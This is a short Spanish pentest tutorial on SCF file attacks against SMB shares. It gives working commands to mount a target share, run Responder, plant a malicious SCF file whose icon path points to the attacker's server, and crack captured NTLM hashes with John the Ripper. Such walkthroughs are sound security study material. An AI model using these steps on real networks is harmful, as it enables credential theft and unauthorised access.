Página de ejemplo: https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

SCF (Shell Command File), Archivo de comandos de Windows.
Estos ficheros son utilizados para realizar un limitado conjunto de operaciones en los sistemas Windows. Sin embargo, los ficheros SCF también pueden usarse para acceder a rutas UNC específicas.

UNC (Universal Naming Convention), una ruta UNC puede ser usada en los ficheros SCF para acceder a recursos de red.

Este posible vector permite a un atacante construir un archivo SCF donde se le indique una ruta UNC. Para el ataque, esta ruta deberá estar en una red compartida donde podamos colocar un servidor en espera de peticiones por un recurso compartido. El envenenamiento vendrá del archivo SCF que deberá estar en un recurso compartido, se ejecutará al ser requerido por la máquina objetivo y esto direccionará gracias a la ruta UNC hacia nuestro servidor Responder, el cual captará los hashes NTML utilizados en las comunicaciones por el protocolo SMB.

Por otro lado, tendremos que hacer uso de este servidor, por lo tanto, habrá que levantar un servidor "Responder". 

** Responder **
Responder es una herramienta que actua como envenenador de LLMNR, NBT-NS Y MDMS. 
Principalmente, Responder, es un módulo escrito en python que permite ver las respuestas de los protocolos NBT-NS (NetBios Name Service), BROWSER, LLMNR (link local multicast name resolution), y DNS en la red. 
Además puede mapear dominios MSSQL servers, ver ICMP redirects, etc.
Responder levantará servidores falsos HTTP, FTP, SMB, etc.

Ataque:
>Creamos una montura desde nuestra máquina a los recursos compartidos de la máquina objetivo
>`mount -t cifs "//<obj_ip>/<recurso>" mnt/smbMounted -o vers=2.1`
>Levantamos el servidor Responder
>`python responder.py -I tun0 -r -d -w`
>Creamos un archivo SCF malicioso
>`[Shell]`
>`command=2`
>`IconFile=\\<own_ip>\smbFolder\loquesea`
>Guardamos el fichero SCF en la montura creada --> `mnt/smbMounted/<recurso>`
>Desde la máquina objetivo accedemos al recurso SCF disponible a través de los recursos compartidos. 
>El servidor Responder obtendrá los hashes NTML que serán pasados cuando la máquina objetivo intente acceder al recurso indicado en el fichero SCF, el cual no existe, y por lo tanto actuará el responder ofreciendo tal archivo.
>Una vez obtenido el hash, podemos crackearlo copiándolo en un archivo de nombre hash
>`john --wordlist=rockyou.txt hash`

